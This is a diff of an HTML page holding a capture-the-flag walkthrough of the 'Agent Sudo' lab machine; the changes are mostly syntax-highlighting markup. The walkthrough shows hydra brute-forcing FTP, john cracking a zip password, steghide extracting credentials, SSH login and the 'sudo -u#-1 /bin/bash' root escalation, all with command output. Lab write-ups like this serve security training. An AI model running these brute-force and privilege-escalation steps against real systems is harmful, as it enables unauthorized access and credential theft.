@@ -125,165 +125,165 @@
 <blockquote>
 <p>namp</p>
 </blockquote>
-<pre class="codehilite"><code>PORT   STATE SERVICE
+<div class="codehilite"><pre><span></span><code>PORT   STATE SERVICE
 21/tcp open  ftp
 22/tcp open  ssh
 80/tcp open  http
-</code></pre>
+</code></pre></div>
 
 <blockquote>
 <p>after going to website it show</p>
 </blockquote>
-<pre class="codehilite"><code>Dear agents,  
+<div class="codehilite"><pre><span></span><code>Dear agents,  
 
 Use your own **codename** as user-agent to access the site.  
 
 From,  
 Agent R
-</code></pre>
+</code></pre></div>
 
 <blockquote>
 <p>So I use like this to find is there anything on agent names field hide</p>
 </blockquote>
-<pre class="codehilite"><code>❯ curl -A &quot;R&quot; -L 10.201.60.51
-What are you doing! Are you one of the 25 employees? If not, I going to report this incident
-&lt;!DocType html&gt;
-&lt;html&gt;
-&lt;head&gt;
-        &lt;title&gt;Annoucement&lt;/title&gt;
-&lt;/head&gt;
+<div class="codehilite"><pre><span></span><code>❯<span class="w"> </span>curl<span class="w"> </span>-A<span class="w"> </span>&quot;R&quot;<span class="w"> </span>-L<span class="w"> </span>10.201.60.51
+What<span class="w"> </span>are<span class="w"> </span>you<span class="w"> </span>doing!<span class="w"> </span>Are<span class="w"> </span>you<span class="w"> </span>one<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>25<span class="w"> </span>employees?<span class="w"> </span>If<span class="w"> </span>not,<span class="w"> </span>I<span class="w"> </span>going<span class="w"> </span>to<span class="w"> </span>report<span class="w"> </span>this<span class="w"> </span>incident
+<span class="cp">&lt;!DocType html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="w">        </span><span class="nt">&lt;title&gt;</span>Annoucement<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
 
-&lt;body&gt;
-&lt;p&gt;
-        Dear agents,
-        &lt;br&gt;&lt;br&gt;
-        Use your own &lt;b&gt;codename&lt;/b&gt; as user-agent to access the site.
-        &lt;br&gt;&lt;br&gt;
-        From,&lt;br&gt;
-        Agent R
-&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;p&gt;</span>
+<span class="w">        </span>Dear<span class="w"> </span>agents,
+<span class="w">        </span><span class="nt">&lt;br&gt;&lt;br&gt;</span>
+<span class="w">        </span>Use<span class="w"> </span>your<span class="w"> </span>own<span class="w"> </span><span class="nt">&lt;b&gt;</span>codename<span class="nt">&lt;/b&gt;</span><span class="w"> </span>as<span class="w"> </span>user-agent<span class="w"> </span>to<span class="w"> </span>access<span class="w"> </span>the<span class="w"> </span>site.
+<span class="w">        </span><span class="nt">&lt;br&gt;&lt;br&gt;</span>
+<span class="w">        </span>From,<span class="nt">&lt;br&gt;</span>
+<span class="w">        </span>Agent<span class="w"> </span>R
+<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div>
 
 <blockquote>
 <p>So after many trying different agents i find something value</p>
 </blockquote>
-<pre class="codehilite"><code>❯ curl -A &quot;C&quot; -L 10.201.60.51
-Attention chris, &lt;br&gt;&lt;br&gt;
+<div class="codehilite"><pre><span></span><code>❯<span class="w"> </span><span class="nv">curl</span><span class="w"> </span><span class="o">-</span><span class="nv">A</span><span class="w"> </span><span class="s2">&quot;C&quot;</span><span class="w"> </span><span class="o">-</span><span class="nv">L</span><span class="w"> </span><span class="mi">10</span>.<span class="mi">201</span>.<span class="mi">60</span>.<span class="mi">51</span>
+<span class="nv">Attention</span><span class="w"> </span><span class="nv">chris</span>,<span class="w"> </span><span class="o">&lt;</span><span class="nv">br</span><span class="o">&gt;&lt;</span><span class="nv">br</span><span class="o">&gt;</span>
 
-Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! &lt;br&gt;&lt;br&gt;
+<span class="k">Do</span><span class="w"> </span><span class="nv">you</span><span class="w"> </span><span class="nv">still</span><span class="w"> </span><span class="nv">remember</span><span class="w"> </span><span class="nv">our</span><span class="w"> </span><span class="nv">deal</span>?<span class="w"> </span><span class="nv">Please</span><span class="w"> </span><span class="nv">tell</span><span class="w"> </span><span class="nv">agent</span><span class="w"> </span><span class="nv">J</span><span class="w"> </span><span class="nv">about</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">stuff</span><span class="w"> </span><span class="nv">ASAP</span>.<span class="w"> </span><span class="nv">Also</span>,<span class="w"> </span><span class="nv">change</span><span class="w"> </span><span class="nv">your</span><span class="w"> </span><span class="nv">god</span><span class="w"> </span><span class="nv">damn</span><span class="w"> </span><span class="nv">password</span>,<span class="w"> </span><span class="nv">is</span><span class="w"> </span><span class="nv">weak</span><span class="o">!</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">br</span><span class="o">&gt;&lt;</span><span class="nv">br</span><span class="o">&gt;</span>
 
-From,&lt;br&gt;
-Agent R 
-</code></pre>
+<span class="nv">From</span>,<span class="o">&lt;</span><span class="nv">br</span><span class="o">&gt;</span>
+<span class="nv">Agent</span><span class="w"> </span><span class="nv">R</span><span class="w"> </span>
+</code></pre></div>
 
 <blockquote>
 <p>so found name lets do it to find pwd for ftp</p>
 </blockquote>
-<pre class="codehilite"><code>❯ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.201.60.51 ftp
-Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+<div class="codehilite"><pre><span></span><code><span class="err">❯</span><span class="w"> </span><span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">chris</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="mf">10.201.60.51</span><span class="w"> </span><span class="n">ftp</span>
+<span class="n">Hydra</span><span class="w"> </span><span class="n">v9</span><span class="mf">.5</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">van</span><span class="w"> </span><span class="n">Hauser</span><span class="o">/</span><span class="n">THC</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">David</span><span class="w"> </span><span class="n">Maciejak</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">military</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">organizations</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">illegal</span><span class="w"> </span><span class="n">purposes</span><span class="w"> </span><span class="p">(</span><span class="n">this</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">non</span><span class="o">-</span><span class="n">binding</span><span class="p">,</span><span class="w"> </span><span class="n">these</span><span class="w"> </span><span class="o">***</span><span class="w"> </span><span class="k">ignore</span><span class="w"> </span><span class="n">laws</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">ethics</span><span class="w"> </span><span class="n">anyway</span><span class="p">).</span>
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-11 09:57:50
-[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking ftp://10.201.60.51:21/
-[STATUS] 203.00 tries/min, 203 tries in 00:01h, 14344196 to do in 1177:42h, 16 active
-[21][ftp] host: 10.201.60.51   login: chris   password: crystal
-1 of 1 target successfully completed, 1 valid password found
-[WARNING] Writing restore file because 1 final worker threads did not complete until end.
-[ERROR] 1 target did not resolve or could not be connected
-[ERROR] 0 target did not complete
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-11 09:59:25
-</code></pre>
+<span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">11</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">57</span><span class="err">:</span><span class="mi">50</span>
+<span class="o">[</span><span class="n">WARNING</span><span class="o">]</span><span class="w"> </span><span class="n">Restorefile</span><span class="w"> </span><span class="p">(</span><span class="n">you</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">seconds</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">abort</span><span class="p">...</span><span class="w"> </span><span class="p">(</span><span class="k">use</span><span class="w"> </span><span class="k">option</span><span class="w"> </span><span class="o">-</span><span class="n">I</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">skip</span><span class="w"> </span><span class="n">waiting</span><span class="p">))</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">previous</span><span class="w"> </span><span class="k">session</span><span class="w"> </span><span class="k">found</span><span class="p">,</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">prevent</span><span class="w"> </span><span class="n">overwriting</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">hydra</span><span class="p">.</span><span class="k">restore</span>
+<span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="nf">max</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="n">tasks</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="n">overall</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="n">tasks</span><span class="p">,</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="p">(</span><span class="nl">l</span><span class="p">:</span><span class="mi">1</span><span class="o">/</span><span class="nl">p</span><span class="p">:</span><span class="mi">14344399</span><span class="p">),</span><span class="w"> </span><span class="o">~</span><span class="mi">896525</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="n">task</span>
+<span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="n">attacking</span><span class="w"> </span><span class="nl">ftp</span><span class="p">:</span><span class="o">//</span><span class="mf">10.201.60.51</span><span class="err">:</span><span class="mi">21</span><span class="o">/</span>
+<span class="o">[</span><span class="n">STATUS</span><span class="o">]</span><span class="w"> </span><span class="mf">203.00</span><span class="w"> </span><span class="n">tries</span><span class="o">/</span><span class="nf">min</span><span class="p">,</span><span class="w"> </span><span class="mi">203</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">01</span><span class="n">h</span><span class="p">,</span><span class="w"> </span><span class="mi">14344196</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mi">1177</span><span class="err">:</span><span class="mi">42</span><span class="n">h</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="n">active</span>
+<span class="o">[</span><span class="n">21</span><span class="o">][</span><span class="n">ftp</span><span class="o">]</span><span class="w"> </span><span class="k">host</span><span class="err">:</span><span class="w"> </span><span class="mf">10.201.60.51</span><span class="w">   </span><span class="nl">login</span><span class="p">:</span><span class="w"> </span><span class="n">chris</span><span class="w">   </span><span class="nl">password</span><span class="p">:</span><span class="w"> </span><span class="n">crystal</span>
+<span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">successfully</span><span class="w"> </span><span class="n">completed</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">found</span>
+<span class="o">[</span><span class="n">WARNING</span><span class="o">]</span><span class="w"> </span><span class="n">Writing</span><span class="w"> </span><span class="k">restore</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="n">worker</span><span class="w"> </span><span class="n">threads</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">complete</span><span class="w"> </span><span class="n">until</span><span class="w"> </span><span class="k">end</span><span class="p">.</span>
+<span class="o">[</span><span class="n">ERROR</span><span class="o">]</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">resolve</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">could</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">connected</span>
+<span class="o">[</span><span class="n">ERROR</span><span class="o">]</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">complete</span>
+<span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">finished</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">11</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">59</span><span class="err">:</span><span class="mi">25</span>
+</code></pre></div>
 
 <blockquote>
 <p>in ftp</p>
 </blockquote>
-<pre class="codehilite"><code>ftp&gt; ls
+<div class="codehilite"><pre><span></span><code>ftp&gt; ls
 200 EPRT command successful. Consider using EPSV.
 150 Here comes the directory listing.
 -rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
 -rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
 -rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
-</code></pre>
+</code></pre></div>
 
 <blockquote>
 <p>after download,</p>
 </blockquote>
-<pre class="codehilite"><code>❯ ls -la
+<div class="codehilite"><pre><span></span><code>❯ ls -la
 total 84
 drwxrwxr-x  2 kali kali  4096 Oct 11 10:04 .
 drwxrwxr-x 13 kali kali  4096 Oct 11 10:01 ..
 -rw-rw-r--  1 kali kali 33143 Oct 29  2019 cute-alien.jpg
 -rw-rw-r--  1 kali kali 34842 Oct 29  2019 cutie.png
 -rw-rw-r--  1 kali kali   217 Oct 29  2019 To_agentJ.txt
-</code></pre>
+</code></pre></div>
 
 <blockquote>
 <p>agent say something so extract cutie.png using <code>binwalk</code></p>
 </blockquote>
-<pre class="codehilite"><code>❯ binwalk -e cutie.png
+<div class="codehilite"><pre><span></span><code><span class="err">❯</span><span class="w"> </span><span class="nx">binwalk</span><span class="w"> </span><span class="o">-</span><span class="nx">e</span><span class="w"> </span><span class="nx">cutie</span><span class="p">.</span><span class="nx">png</span>
 
-DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------------
-869           0x365           Zlib compressed data, best compression
-34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+<span class="nx">DECIMAL</span><span class="w">       </span><span class="nx">HEXADECIMAL</span><span class="w">     </span><span class="nx">DESCRIPTION</span>
+<span class="o">--------------------------------------------------------------------------------</span>
+<span class="mi">869</span><span class="w">           </span><span class="mh">0x365</span><span class="w">           </span><span class="nx">Zlib</span><span class="w"> </span><span class="nx">compressed</span><span class="w"> </span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="nx">best</span><span class="w"> </span><span class="nx">compression</span>
+<span class="mi">34562</span><span class="w">         </span><span class="mh">0x8702</span><span class="w">          </span><span class="nx">Zip</span><span class="w"> </span><span class="nx">archive</span><span class="w"> </span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="nx">compressed</span><span class="w"> </span><span class="nx">size</span><span class="p">:</span><span class="w"> </span><span class="mi">98</span><span class="p">,</span><span class="w"> </span><span class="nx">uncompressed</span><span class="w"> </span><span class="nx">size</span><span class="p">:</span><span class="w"> </span><span class="mi">86</span><span class="p">,</span><span class="w"> </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">To_agentR</span><span class="p">.</span><span class="nx">txt</span>
 
-WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
+<span class="nx">WARNING</span><span class="p">:</span><span class="w"> </span><span class="nx">One</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="nx">more</span><span class="w"> </span><span class="nx">files</span><span class="w"> </span><span class="nx">failed</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">extract</span><span class="p">:</span><span class="w"> </span><span class="nx">either</span><span class="w"> </span><span class="nx">no</span><span class="w"> </span><span class="nx">utility</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">found</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="nx">it</span><span class="err">&#39;</span><span class="nx">s</span><span class="w"> </span><span class="nx">unimplemented</span>
 
-❯ ls -la
-total 88
-drwxrwxr-x  3 kali kali  4096 Oct 11 10:07 .
-drwxrwxr-x 13 kali kali  4096 Oct 11 10:01 ..
--rw-rw-r--  1 kali kali 33143 Oct 29  2019 cute-alien.jpg
--rw-rw-r--  1 kali kali 34842 Oct 29  2019 cutie.png
-drwxrwxr-x  2 kali kali  4096 Oct 11 10:07 _cutie.png.extracted
--rw-rw-r--  1 kali kali   217 Oct 29  2019 To_agentJ.txt
-</code></pre>
+<span class="err">❯</span><span class="w"> </span><span class="nx">ls</span><span class="w"> </span><span class="o">-</span><span class="nx">la</span>
+<span class="nx">total</span><span class="w"> </span><span class="mi">88</span>
+<span class="nx">drwxrwxr</span><span class="o">-</span><span class="nx">x</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="nx">kali</span><span class="w"> </span><span class="nx">kali</span><span class="w">  </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Oct</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">07</span><span class="w"> </span><span class="p">.</span>
+<span class="nx">drwxrwxr</span><span class="o">-</span><span class="nx">x</span><span class="w"> </span><span class="mi">13</span><span class="w"> </span><span class="nx">kali</span><span class="w"> </span><span class="nx">kali</span><span class="w">  </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Oct</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">01</span><span class="w"> </span><span class="p">..</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="nx">kali</span><span class="w"> </span><span class="nx">kali</span><span class="w"> </span><span class="mi">33143</span><span class="w"> </span><span class="nx">Oct</span><span class="w"> </span><span class="mi">29</span><span class="w">  </span><span class="mi">2019</span><span class="w"> </span><span class="nx">cute</span><span class="o">-</span><span class="nx">alien</span><span class="p">.</span><span class="nx">jpg</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="nx">kali</span><span class="w"> </span><span class="nx">kali</span><span class="w"> </span><span class="mi">34842</span><span class="w"> </span><span class="nx">Oct</span><span class="w"> </span><span class="mi">29</span><span class="w">  </span><span class="mi">2019</span><span class="w"> </span><span class="nx">cutie</span><span class="p">.</span><span class="nx">png</span>
+<span class="nx">drwxrwxr</span><span class="o">-</span><span class="nx">x</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="nx">kali</span><span class="w"> </span><span class="nx">kali</span><span class="w">  </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Oct</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">07</span><span class="w"> </span><span class="nx">_cutie</span><span class="p">.</span><span class="nx">png</span><span class="p">.</span><span class="nx">extracted</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="nx">kali</span><span class="w"> </span><span class="nx">kali</span><span class="w">   </span><span class="mi">217</span><span class="w"> </span><span class="nx">Oct</span><span class="w"> </span><span class="mi">29</span><span class="w">  </span><span class="mi">2019</span><span class="w"> </span><span class="nx">To_agentJ</span><span class="p">.</span><span class="nx">txt</span>
+</code></pre></div>
 
 <blockquote>
 <p>so in extracted file has zip so have to find pwd</p>
 </blockquote>
-<pre class="codehilite"><code>❯ ls -la
+<div class="codehilite"><pre><span></span><code>❯ ls -la
 total 324
 drwxrwxr-x 2 kali kali   4096 Oct 11 10:07 .
 drwxrwxr-x 3 kali kali   4096 Oct 11 10:07 ..
 -rw-rw-r-- 1 kali kali 279312 Oct 11 10:07 365
 -rw-rw-r-- 1 kali kali  33973 Oct 11 10:07 365.zlib
 -rw-rw-r-- 1 kali kali    280 Oct 11 10:07 8702.zip
-</code></pre>
+</code></pre></div>
 
 <blockquote>
 <p>so have to find zip pwd</p>
 </blockquote>
-<pre class="codehilite"><code>❯ zip2john 8702.zip &gt; forjohn
-john --wordlist=/usr/share/wordlists/rockyou.txt forjohn
-Using default input encoding: UTF-8
-Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
-Cost 1 (HMAC size) is 78 for all loaded hashes
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-alien            (8702.zip/To_agentR.txt)     
-1g 0:00:00:01 DONE (2025-10-11 10:12) 0.8403g/s 20652p/s 20652c/s 20652C/s christal..280789
-Use
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="err">❯</span><span class="w"> </span><span class="n">zip2john</span><span class="w"> </span><span class="mf">8702.</span><span class="n">zip</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">forjohn</span>
+<span class="n">john</span><span class="w"> </span><span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="n">forjohn</span>
+<span class="n">Using</span><span class="w"> </span><span class="n">default</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">encoding</span><span class="p">:</span><span class="w"> </span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="n">Loaded</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="p">(</span><span class="n">ZIP</span><span class="p">,</span><span class="w"> </span><span class="n">WinZip</span><span class="w"> </span><span class="p">[</span><span class="n">PBKDF2</span><span class="o">-</span><span class="n">SHA1</span><span class="w"> </span><span class="mi">256</span><span class="o">/</span><span class="mi">256</span><span class="w"> </span><span class="n">AVX2</span><span class="w"> </span><span class="mi">8</span><span class="n">x</span><span class="p">])</span>
+<span class="n">Cost</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="n">HMAC</span><span class="w"> </span><span class="n">size</span><span class="p">)</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="mi">78</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="n">loaded</span><span class="w"> </span><span class="n">hashes</span>
+<span class="n">Will</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">OpenMP</span><span class="w"> </span><span class="n">threads</span>
+<span class="n">Press</span><span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">abort</span><span class="p">,</span><span class="w"> </span><span class="n">almost</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">status</span>
+<span class="n">alien</span><span class="w">            </span><span class="p">(</span><span class="mf">8702.</span><span class="n">zip</span><span class="o">/</span><span class="n">To_agentR</span><span class="o">.</span><span class="n">txt</span><span class="p">)</span><span class="w">     </span>
+<span class="mi">1</span><span class="n">g</span><span class="w"> </span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">01</span><span class="w"> </span><span class="n">DONE</span><span class="w"> </span><span class="p">(</span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">11</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">12</span><span class="p">)</span><span class="w"> </span><span class="mf">0.8403</span><span class="n">g</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="mi">20652</span><span class="n">p</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="mi">20652</span><span class="n">c</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="mi">20652</span><span class="n">C</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="n">christal</span><span class="o">..</span><span class="mi">280789</span>
+<span class="n">Use</span>
+</code></pre></div>
 
 <blockquote>
 <p>find pwd <code>alien</code>  after extract found txt</p>
 </blockquote>
-<pre class="codehilite"><code>Agent C,
+<div class="codehilite"><pre><span></span><code><span class="nv">Agent</span><span class="w"> </span><span class="nv">C</span>,
 
-We need to send the picture to 'QXJlYTUx' as soon as possible!
+<span class="nv">We</span><span class="w"> </span><span class="nv">need</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="k">send</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">picture</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="s1">&#39;QXJlYTUx&#39;</span><span class="w"> </span><span class="nv">as</span><span class="w"> </span><span class="nv">soon</span><span class="w"> </span><span class="nv">as</span><span class="w"> </span><span class="nv">possible</span><span class="o">!</span>
 
-By,
-Agent R
-</code></pre>
+<span class="nv">By</span>,
+<span class="nv">Agent</span><span class="w"> </span><span class="nv">R</span>
+</code></pre></div>
 
 <blockquote>
 <p>use cyberchef to convert into something and found something <code>Area51</code></p>
 </blockquote>
-<pre class="codehilite"><code>❯ steghide info cute-alien.jpg
+<div class="codehilite"><pre><span></span><code>❯ steghide info cute-alien.jpg
 &quot;cute-alien.jpg&quot;:
   format: jpeg
   capacity: 1.8 KB
@@ -293,12 +293,12 @@ Enter passphrase:
     size: 181.0 Byte
     encrypted: rijndael-128, cbc
     compressed: yes
-</code></pre>
+</code></pre></div>
 
 <blockquote>
 <p>see it has somethinf important txt to see extract that</p>
 </blockquote>
-<pre class="codehilite"><code>❯ steghide extract -sf cute-alien.jpg
+<div class="codehilite"><pre><span></span><code>❯ steghide extract -sf cute-alien.jpg
 Enter passphrase: 
 wrote extracted data to &quot;message.txt&quot;.
 ❯ ls -la
@@ -315,42 +315,42 @@ Hi james,
 
 Glad you find this message. Your login password is hackerrules!
 
-Don't ask me why the password look cheesy, ask agent R who set this password for you.
+Don&#39;t ask me why the password look cheesy, ask agent R who set this password for you.
 
 Your buddy,
 chris
-</code></pre>
+</code></pre></div>
 
 <blockquote>
 <p>find something so using that <code>james</code> &amp; <code>hackerrules!</code> log to ssh</p>
 <p>in home has flag and something image to invistigate i get that to my machine using python server after , time for privesc</p>
 </blockquote>
-<pre class="codehilite"><code>Matching Defaults entries for james on agent-sudo:
+<div class="codehilite"><pre><span></span><code>Matching Defaults entries for james on agent-sudo:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User james may run the following commands on agent-sudo:
     (ALL, !root) /bin/bash
-</code></pre>
+</code></pre></div>
 
 <blockquote>
 <p>search on google <code>(allroot )/bin/bash exploit</code> and found something important and command you can run to read files as root <code>sudo -u#-1 /bin/bash</code></p>
 </blockquote>
-<pre class="codehilite"><code>james@agent-sudo:~$ cat /root/root.txt
